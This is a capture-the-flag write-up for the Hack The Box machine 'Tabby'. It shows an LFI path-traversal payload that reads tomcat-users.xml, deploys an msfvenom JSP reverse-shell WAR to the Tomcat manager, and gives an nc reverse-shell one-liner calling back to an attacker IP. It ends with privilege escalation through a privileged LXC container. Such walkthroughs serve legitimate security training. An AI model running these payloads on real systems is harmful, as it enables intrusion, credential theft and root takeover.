# Tabby [HTB](https://app.hackthebox.com/machines/259)
![tabby-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/tabby-01.png)

## Recon


After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 tabby.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/ports-02.png)


Let's run a version detection scan againts these ports:

```bash
nmap -p 22,80,8080 -sCV tabby.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/nmap-res-03.png)

We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.41 server on port 80.
+ An Apache Tomcat server on port 8080.


We have two services on the target with HTTP and SSH. We also have two types of HTTP servers, with a regular Apache server as well as a Tomcat server, which is desinged for Java applications. Based on the SSH probing scripts we can guess that the target OS is running Ubuntu. 


Let's start with the Apache server! 


### Apache Port 80


If we browse to `http://tabby.htb/` we see the following:

![mega-site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/mega-site-04.png)


The site seems to be offering cloud services for storage and hosting. There are several buttons that should function as links but they lead nowhere. The only working link I see is for a security statement regarding a recent breach the company suffered. 


The link redirects to the following URL: `http://megahosting.htb/news.php?file=statement`. 


There are a couple of interesting things about this URL. First it introduces a new domain name of `megahosting.htb`, I added this domain to my `/etc/hosts` file, and mapped it to the external IP of the target. The second thing about the URL is the `file` parameter, this could be a potential target for a file inclusion vulnerability. 


If we open this link we see the statement:

![statement-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/statement-05.png)


The statement says that they removed "this tool" due to a previous breach. It's unclear which tool they are reffering to. They also mention that they invested in more secure servers, what this is referring to is also unclear. 


At this point I decided to start testing for file inclusion in the `news.php` script. After several attempts I was able to pull `/etc/passwd` with the following payload: 


`news.php?file=../../../../etc/passwd`


![lfi-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/lfi-06.png)


I also tried to pull off RFI but to no avail. The question is how do we exploit this? We can try to manually guess possible filenames at various paths, but this will be the least efficient method in my opinion.


Instead, I decided to run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://tabby.htb/FUZZ -e .txt,.xml,.html,.php
```

![ffuf-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/ffuf-07.png)


The most interesting entry here is the `files` directory, but we can't list it's contents. I ran a directory scan againt the `files` subdirectory as well, inside it I found the `statement` file and an `archive` directory. I tried to scan for files inside the `archive` directory as well but to no avail. 


The rest of the `ffuf` are not super useful. 


At this point we can conclude that we have an LFI vulnerability on this site, but we don't have a clear way of exploiting it. 


Let's check the Tomcat server


### Tomcat Port 8080


If we browse towards `http://tabby.htb:8080/` we see a default installation page for the Tomcat server:

![tomcat-site-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/tomcat-site-08.png)


There are a couple of important things to note here. First, the Tomcat version is `Tomcat 9`. Another important piece of information is the location of the `tomcat-users.xml` file, which serves as the user database to the Tomcat manager application. The page says it's located in `/etc/tomcat-users.xml`, I tried to use the previous LFI vulnerability we found to access this file at this path but it doens't exists.


I searched online for the exact location of the `tomcat-users.xml` file and found [this](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html) official Tomcat page which says that the file is located at `$CATALINA_BASE/conf/tomcat-users.xml`. Based on the installation page we saw earlier it should be at `/var/lib/tomcat9/conf/tomcat-users.xml`, but upon requesting the file via the LFI nothing comes back. 


After a bit more googeling I found [this](https://talk.openmrs.org/t/configuring-apache-tomcat-9/32379) artical, that suggests that the file could be located at `usr/share/tomcat9/etc/tomcat-users.xml`. 


I used the LFI vulnerability to get the file using the following request: `http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml`


![tomcat-pass-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/tomcat-pass-09.png)


The credentials are `tomcat : $3cureP4s5w0rd123!`, and we can see this user has the `admin-gui` and `manager-script` roles which should give us access to the text based manager application, not the GUI. 


### Manager Exploit
 
Based on our user's roles, we only have access to the text based Manager system, so to exploit this we have to use the command line.


First, let's create a WAR reverse shell script using:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.54 LPORT=443 -f war > app.war
```

Next, start the local listener with:

```bash
rlwrap nc -lnvp 443
```


Now we need to create a varaible for the password and deploy the `app.war` file using:

```bash
password=\$3cureP4s5w0rd123!
curl -v -u tomcat:$password --upload-file app.war "http://tabby.htb:8080/manager/text/deploy?path=/app/update=true"
```

![uploaded-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/uploaded-12.png)


Looks good, let's try to access it with:

```bash
curl http://tabby.htb:8080/app/
```

![shell-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/shell-13.png)


The shell is a bit weird, so I start another lisetner and connect with the following payload:

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.54 445 >/tmp/f
```

![nice-shell-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/nice-shell-14.png)


## Privilege Escalation

After landing on the box I spwan a TTY shell using:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I try to list any sudo permissions but we have none. So I start looking around the filesystem. Inside of the `/var/www/html/files` directory I found a backup archive:

![backup-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/backup-15.png)


It's owned by `ash` and its readable across the system. Let's transfer this file over to our attack machine to anaylze. To do this I start a an FTP server on the attack machine with:

```bash
python -m pyftpdlib -w
```

Then I connect to the FTP server from the target machine and copy the files over:

```bash
ftp 10.10.14.54 2121
ftp> anonymous
ftp> anonymous
ftp> put 16162020_backup.zip
ftp> bye
```

Now we have the archive over on our attack machine:

![transfered-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/transfered-16.png)


If we try to extarct the archive we get prompted for credentials:

![give-pass-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/give-pass-17.png)


Let's try to crack it with john:

```bash
zip2john 16162020_backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![cracked-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/cracked-18.png)


The password cracks to `admin@it`. If we list the contents of the archive with `unzip -l 16162020_backup.zip` we will se it's simply a backup of the megahosting website:

![list-zip-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/zip-list-19.png)


Not much to do with this backup, so I thought maybe we can reuse the password? 


If we try to login via SSH we get the following error:

![ssh-err-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/shh-err-20.png)


But if we run `su ash` on the target and supply the password we get a shell as `ash`:

![ash-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/ash-21.png)


### Ash


If we take a look at the output of the `id` command, we will notice that our user is a part of the `lxc` group, which is used to allow users to create and manage Linux containers. This can exploited by creating a root-level privilege container from the current file system and interacting with it, executing `/bin/sh` and therefore starting a root shell. Here is the easiest way to exploit this. 


First, on our Kali machine, we need to clone and build an image of the Alpine distro from a repository on Github:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
sudo ./build-alpine
```

This should have created a couple of tar archvies in the working directory:

![archives-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/archives-22.png)


The next step is to transfer one of them to the target machine, we can do this with a simple python web server:

```bash
python3 -m http.server 80
```

Then, from the target in `ash`'s home directory, download the archive using:

```bash
cd ~
wget http://10.10.14.54/alpine-v3.19-x86_64-20231222_0748.tar.gz
```

The next step is to import the image using the `lxc` command, It's important to do this from the user's home folder:

```bash
export PATH=$PATH:/snap/bin  	# Needed becasue /snap/bin is not in ash's PATH
lxc image import ./alpine-v3.19-x86_64-20231222_0748.tar.gz --alias myimage
```


![import-22.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/import-22.5.png)


Then we need to run `lxd init` as the above output suggested, and select all the default options. 


After which we can run our image with the `security.privileged` flag set to true, which will grant the current user unconditioned root access to it:


```bash
lxc init myimage mycontainer -c security.privileged=true 
```

![create-container-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/create-container-23.png)


The next step is to mount the root folder of the container, under `/mnt/root`:

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
```

![mount-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/mount-24.png)


Finally, we can start the container and use the `exec` sub-command of `lxc` to spwan a shell from it:

```bash
lxc start mycontainer
lxc exec mycontainer /bin/bash
```

![root-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/root-25.png)


The shell is a bit weird, and the filesystem is that of the container. The actual filesystem is mounted in `/mnt/root`: 

![filesystem-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/filesystem-26.png)


From here we can navigate the filesytem per ususal and get the root flag:

![flag-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/img/flag-27.png)
